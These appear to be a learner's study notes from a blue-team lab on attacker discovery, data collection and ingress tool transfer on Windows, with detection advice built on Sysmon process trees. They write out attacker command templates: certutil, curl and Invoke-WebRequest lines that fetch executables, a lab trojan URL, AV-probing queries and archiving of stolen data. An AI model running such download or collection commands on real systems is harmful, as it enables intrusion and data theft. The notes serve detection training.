
---

## Big picture

- After **Initial Access** attackers move into **Discovery** to map the host: who’s logged in, what the machine does, what defenses exist — then they **collect** valuables and **exfiltrate** them.
    
- Think: burglars checking rooms, then stuffing the safe into a bag.
    

![[Pasted image 20251111052208.png]]

---

## Discovery: goals

- **Figure out host purpose** (user job, data locations).
    
- **Enumerate users & privileges** (to find escalatable accounts).
    
- **Identify software & services** (vulnerabilities or data sources).
    
- **Check network** (is this a standalone machine or corporate network?).
    
- **Probe antivirus/endpoint controls** (risk level to continue).
    

---

## Common commands / artefacts to watch for

- Files & folders: `type`, `Get-Content`, `dir`, `Get-ChildItem` → file reads show interest in data.
    
- Users & groups: `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`.
    
- System/apps: `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`.
    
- Network: `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`.
    
- AV check: `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` or Defender-specific queries.
    
- GUI discovery: explorer/mmc/control panel/taskmgr/notepad usage — look for interactive sessions.
    

---

## How attackers run discovery

- **Automated/scripted** (spawned from a phishing exe → runs many commands quickly).
    
- **Interactive GUI** (RDP or shell session where learner-like tools are used — MMC, Notepad, etc.).
    
- **Process parentage matters**: suspicious parent (malware) → child `cmd.exe`/`powershell.exe` running the commands.
    

---

## Detecting Discovery

- Look for **process creation events** (Sysmon Event ID 1) with sequences of discovery commands in short windows.
    
- Build **process trees** by correlating `ProcessId` / `ParentProcessId` to see origin (e.g., `explorer.exe` → `invoice.pdf.exe` → `cmd.exe`).
    
- Contextualize: ipconfig or whoami can be benign — check **who launched it**, timing, and frequency.
    

![[Pasted image 20251111052227.png]]

---

## Searching & Collection (what attackers want)

![[Pasted image 20251111052243.png]]

- Targets depend on motive:
    
    - **Blackmail**: photos, chats, browser history.
        
    - **Money theft**: crypto wallets, banking sessions (`wallet.dat`, Chrome Cookies).
        
    - **Corporate espionage**: SSH keys, SQL data, backups, proprietary docs, `C:\Program Files\Microsoft SQL Server\...`.
        
- Collection methods: manual browsing (Notepad/Wordpad), scripted search (`Get-ChildItem -Recurse -Filter *.pdf`), copying, archiving (`Compress-Archive`, `7za`).
    

---

## Detecting Collection

- Look for **file opens/reads** of sensitive paths, `notepad.exe`/`wordpad.exe` accessing strange files, rapid recursion & copies.
    
- Watch for archivers (`Compress-Archive`, `7za.exe`, `zip` creation) and writes to staging locations (e.g., `C:\Temp\stolen_data.zip`).
    
- Data stealer malware may not use CMD/PowerShell — instead look for single suspicious binary performing many file reads and exfil attempts.
    

---

## Data stealers & automation

- Stealers (e.g., Gremlin-like) target browsers, wallets, messengers, captures screenshots — **they often avoid typical CMD logs**, making detection harder.
    
- Detect by file I/O patterns, abnormal processes accessing many user data folders, and unusual outgoing connections.
    

---

## Ingress Tool Transfer (downloading follow-ups)

- Attackers often download extra tools rather than packing everything in one file — reasons: evade AV, modularity.

![[Pasted image 20251111061647.png]]

- Common download methods:
    
    - `certutil.exe -urlcache -f https://.../bad.exe good.exe`
        
    - `curl.exe https://... -o bad.exe` (Windows 10+)
        
    - `powershell -c "Invoke-WebRequest -Uri 'https://...' -OutFile 'good.exe'"`
        
    - Manual copy via RDP or browser.
        
- Detect by monitoring **network connections / DNS** from suspicious processes and process-created files saved after network activity.
    

---

## Quick detection checklist (practical)

- ✅ Capture **process creation** (Sysmon/Evtx).
    
- ✅ Build **process trees** — flag suspicious parents.
    
- ✅ Alert on **rapid sequences** of discovery commands within short windows.
    
- ✅ Watch for **mass file reads** in user profile folders and **archive creation**.
    
- ✅ Correlate **outbound connections** (especially to cloud storage, GitHub, Telegram, odd domains) with recent archiver or stealer processes.
    
- ✅ Pay special attention to binaries launched from `Downloads`, `Desktop`, or odd explorer child processes (e.g., `invoice.pdf.exe`).
    

---

## For your lab tasks (what to run/look at)

- Sample files mentioned in the lab:
    
    - `C:\Users\Administrator\Desktop\Practice\Task 3\invoice.pdf.exe` (Discovery example).
        
    - `C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe` (data stealer sample).
        
- URL provided for Ingress Tool Transfer exercise: `http://appsforfree.thm/trojan.exe` — treat as lab-only resource; monitor process creation, network/DNS logs, and file writes when testing.
    

---

